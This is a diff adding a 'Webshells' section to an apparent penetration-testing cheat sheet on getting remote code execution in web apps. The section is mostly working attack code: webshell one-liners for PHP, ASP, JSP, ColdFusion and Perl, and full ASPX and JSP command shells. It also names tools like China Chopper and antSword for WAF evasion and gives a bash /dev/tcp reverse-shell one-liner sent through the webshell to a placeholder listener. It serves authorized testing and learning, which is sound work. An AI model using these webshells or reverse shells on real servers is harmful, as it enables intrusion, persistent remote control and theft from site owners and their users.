@@ -11,6 +11,7 @@ Getting the web app to run **your** code/commands on the server. Scope: authoriz
 - [Template injection (SSTI)](#template-injection-ssti)
 - [Insecure deserialization](#insecure-deserialization)
 - [File upload → RCE](#file-upload--rce)
+- [Webshells](#webshells)
 - [LFI → RCE](#lfi--rce)
 - [Tooling](#tooling)
 - [Defense / detection (for the report)](#defense--detection-for-the-report)
@@ -133,6 +134,78 @@ Bypasses when the upload is filtered:
 - **`.htaccess` trick** (Apache): upload `.htaccess` with `AddType application/x-httpd-php .jpg` → `.jpg` files execute as PHP.
 - **Path/overwrite:** path traversal in the filename to drop it in the webroot.
 - Confirm the upload **lands in a web-accessible, script-executing** directory — otherwise it's just a file write.
+
+## Webshells
+
+Once a [file upload](#file-upload--rce) or a write primitive lands a script in a web-executing directory, the webshell is your command channel. Match the language to the stack — fingerprint it first (`whatweb`, response headers, the file extensions the site already serves). Drop a webshell only on an authorized target, note it in your engagement `tools.txt`, and delete it before you leave.
+
+### Minimal one-liners by stack
+
+| Stack | Ext | Webshell | Call it with |
+| --- | --- | --- | --- |
+| PHP | `.php` | `<?php system($_GET['c']); ?>` | `?c=id` |
+| PHP (POST, stealthier) | `.php` | `<?php system($_REQUEST['c']); ?>` | GET or POST `c=` |
+| PHP (no `system`) | `.php` | `<?php echo shell_exec($_GET['c']); ?>` | `?c=id` |
+| PHP (functions blocked) | `.php` | `<?php echo passthru($_GET['c']); ?>` / `exec` / `` `$_GET[c]` `` (backticks) | `?c=id` |
+| ASP (classic/IIS) | `.asp` | `<% eval request("c") %>` | `?c=Response.Write(...)` |
+| ASP.NET | `.aspx` | `<% Response.Write(new System.Diagnostics.Process... %>` — use the [full aspx cmd shell](#aspx-cmd-shell) | web form |
+| JSP (Tomcat/Java) | `.jsp` | `<% Runtime.getRuntime().exec(request.getParameter("c")); %>` — see [JSP](#jsp) | `?c=id` |
+| ColdFusion | `.cfm` | `<cfexecute name="cmd.exe" arguments="/c #url.c#" timeout="10"/>` | `?c=whoami` |
+| Perl/CGI | `.pl`/`.cgi` | `print "Content-Type:text/html\n\n".`$ENV{QUERY_STRING}`;` | query string |
+
+PHP has the most fallbacks because hardening often disables one function but not all: try `system` → `shell_exec` → `exec` → `passthru` → `popen` → `proc_open` → backticks. If `disable_functions` kills every exec call, pivot to a `disable_functions` bypass (see [Tooling](#tooling) — PHPGGC / known CVEs) or to [LFI → RCE](#lfi--rce).
+
+### aspx cmd shell
+
+```aspx
+<%@ Page Language="C#" %>
+<% System.Diagnostics.Process p = new System.Diagnostics.Process();
+   p.StartInfo.FileName = "cmd.exe";
+   p.StartInfo.Arguments = "/c " + Request["c"];
+   p.StartInfo.UseShellExecute = false;
+   p.StartInfo.RedirectStandardOutput = true;
+   p.Start();
+   Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>"); %>
+```
+
+Call: `shell.aspx?c=whoami`. IIS usually runs as a low-priv app-pool identity with `SeImpersonate` — a quick path to SYSTEM via a potato attack ([Windows Privilege Escalation](../Windows/Privilege%20Escalation.md)).
+
+### JSP
+
+```jsp
+<%@ page import="java.util.*,java.io.*" %>
+<% if(request.getParameter("c")!=null){
+     Process p=Runtime.getRuntime().exec(request.getParameter("c"));
+     BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream()));
+     String l; while((l=d.readLine())!=null){ out.println(l+"<br>"); } } %>
+```
+
+Call: `shell.jsp?c=id`. On Tomcat you can also drop a `.war` via the manager app — see [Remote Access](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md).
+
+### Framework / full-featured webshells
+
+When a one-liner isn't enough (file browser, upload, DB access, stealth), use a purpose-built one — but know their hashes are in every AV/EDR signature set, so they're for labs and authorized tests where evasion isn't the point:
+
+| Tool | Notes |
+| --- | --- |
+| **weevely** | `weevely generate <pass> shell.php` → obfuscated, password-protected PHP; connect with `weevely <url> <pass>`. Terminal-like session, 30+ modules |
+| **China Chopper** | Tiny (~70 byte) one-liner webshell driven by a GUI client; the classic red-team/APT PHP/ASPX/JSP shell |
+| **p0wny-shell** | Single-file PHP, semi-interactive terminal with a persistent CWD — nicer than a raw `?c=` |
+| **b374k / WSO** | Full PHP panels: file manager, SQL client, reverse-shell launcher |
+| **antSword** | Cross-platform GUI client managing PHP/ASP/ASPX/JSP shells, with encoders to dodge WAFs |
+| **Kali `/usr/share/webshells/`** | Ships ready PHP/ASP/ASPX/JSP/Perl/ColdFusion shells (incl. the Laudanum set) |
+
+### Upgrade a webshell to a real shell
+
+A `?c=` webshell is clumsy — no state, no TTY, re-runs each command fresh. Trade it for an interactive reverse shell as soon as you have execution:
+
+```
+# through the webshell, fire a one-liner at your listener:
+shell.php?c=bash -c 'bash -i >%26 /dev/tcp/IP/PORT 0>%261'
+#   %26 = URL-encoded & ; URL-encode the whole payload if it has spaces/specials
+```
+
+Catch it and upgrade the TTY — see [Shell](../Shell/README.md), [netcat](../Shell/netcat.md), [pwncat](../Shell/pwncat.md). Reverse-shell one-liners for every language: [shell](../Shell/shell.md) and [revshells.com](https://www.revshells.com).
 
 ## LFI → RCE
 
